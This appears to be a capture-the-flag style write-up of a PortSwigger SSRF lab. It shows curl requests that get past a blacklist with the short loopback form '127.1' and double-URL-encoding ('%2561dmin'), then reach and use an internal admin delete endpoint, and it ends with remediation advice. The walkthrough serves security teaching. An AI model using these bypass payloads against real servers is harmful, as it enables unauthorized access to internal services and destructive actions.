---
layout: post
title: "SSRF With Blacklist-Based Input Filter"
date: 2027-08-21 09:00:00 -0500
categories: [PortSwigger, SSRF]
tags: [ssrf, cwe-918, blacklist-bypass, double-url-encoding, server-side-request-forgery]
---

## Overview

This is the same "Check stock" SSRF primitive as the basic labs — the `stockApi` field holds an **entire URL** that the application fetches server-side — but this time the developer bolted on a defence. A **blacklist** rejects requests that look like they target the internal admin panel. The lesson of the lab is that a blacklist is a fragile defence: the very same request can be written in many forms the list never anticipated.

The goal is to reach `http://localhost/admin` and delete the user `carlos`.

---

## The sink

On a product page, the stock checker submits:

```
POST /product/stock
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

The value is a complete URL, so whatever you put there, the server requests.

## Two layers of blacklist — and two bypasses

The filter blocks both the loopback **host** and the sensitive **path keyword**.

### Layer 1 — host filter

```bash
curl -s -X POST '.../product/stock' --data 'stockApi=http://127.0.0.1/'
# -> 400  "External stock check blocked for security reasons"
```

`127.0.0.1` and `localhost` are blacklisted. But the operating system treats many strings as loopback that the blacklist never lists. The short form works:

```bash
curl -s -X POST '.../product/stock' --data 'stockApi=http://127.1/'
# -> 200  (home page returned = SSRF to localhost succeeded)
```

`127.1` resolves to `127.0.0.1`, but the literal string `127.1` is not in the list. (Other members of this family: decimal `2130706433`, octal `0177.0.0.1`, hex `0x7f000001`, IPv6 `[::1]`, and `0.0.0.0`.)

### Layer 2 — path keyword filter

```bash
curl -s -X POST '.../product/stock' --data 'stockApi=http://127.1/admin'
# -> 400  (the substring "admin" is blocked)
```

Defeat this by **double-URL-encoding** one character of the keyword. Encode `a` as `%2561`:

```bash
curl -s -X POST '.../product/stock' --data 'stockApi=http://127.1/%2561dmin'
# -> 200  (the admin panel HTML comes back)
```

Why it works: the blacklist checks the literal string it receives — it sees `%2561dmin`, which does not contain `admin`, so it passes. But the value is URL-decoded **twice** before the internal request is made: `%2561` → `%61` → `a`, so the internal admin app routes the request to `/admin`.

> A practical note: encoding *which* character matters. Encoding the leading `a` (`%2561dmin`) reached the panel, while encoding an interior character (`ad%2561in`) returned a 404 on this instance. If one position fails, try another.

The admin panel reveals the delete link:

```html
<a href="/admin/delete?username=carlos">Delete</a>
```

## Solving — delete carlos

Apply both bypasses to the delete URL:

```bash
curl -s -X POST '.../product/stock' \
  --data 'stockApi=http://127.1/%2561dmin/delete?username=carlos'
# -> HTTP 302  (carlos deleted)
```

The lab status flips to **Solved**.

---

## Why it worked

A blacklist only knows the exact forbidden strings its author thought of. Two independent canonicalization gaps each reconstruct the banned value from a form the list does not recognise:

- The OS IP parser turns `127.1` back into `127.0.0.1`.
- A double URL-decode turns `%2561` back into `a`, rebuilding `admin` after the check has already passed.

## Fix

- **Use an allowlist, not a blacklist.** Permit only known-good destinations.
- **Canonicalize, then validate.** Fully decode the URL and resolve the hostname to an IP, then reject private/loopback ranges — so encoding tricks cannot slip a banned target past the check.
- **Do not grant trust based on the request originating from localhost.** Any SSRF on the host defeats that assumption; protect the admin interface with real authentication.

**CWE-918: Server-Side Request Forgery (SSRF)**
